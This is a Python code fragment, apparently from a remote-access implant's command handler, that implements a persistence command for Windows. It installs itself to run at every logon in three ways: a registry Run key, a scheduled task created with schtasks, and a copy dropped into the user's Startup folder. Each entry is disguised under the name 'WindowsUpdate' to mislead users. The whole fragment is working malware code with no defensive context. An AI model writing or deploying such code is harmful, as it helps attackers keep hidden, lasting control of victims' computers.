    def cmd_persist(self, params):
        try:
            method = params.get('method', 'registry')
            if method == 'registry':
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                return {'success': True, 'method': 'registry'}
            elif method == 'scheduled_task':
                task_name = "WindowsUpdate"
                subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc onlogon /f', shell=True)
                return {'success': True, 'method': 'scheduled_task'}
            elif method == 'startup_folder':
                startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                shutil.copy(sys.executable, os.path.join(startup, 'windows_update.exe'))
                return {'success': True, 'method': 'startup_folder'}
            return {'success': False, 'error': 'Unknown persistence method'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
            
